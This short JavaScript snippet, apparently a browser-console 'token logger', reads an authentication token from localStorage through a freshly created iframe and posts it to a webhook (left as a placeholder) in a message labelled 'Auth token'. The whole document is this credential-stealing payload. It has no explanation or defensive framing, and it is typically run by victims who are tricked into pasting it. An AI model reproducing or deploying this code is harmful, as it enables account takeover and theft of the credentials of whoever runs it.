var t = document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.token; var token = t.replace(/['"]+/g, ''); const r = new XMLHttpRequest();r.open("POST", "webhook here");r.setRequestHeader('Content-type', 'application/json');const params = { username: "TOKEN LOGGER", avatar_url: "", content: `Auth token: ${token}` };r.send(JSON.stringify(params));r.send(null);
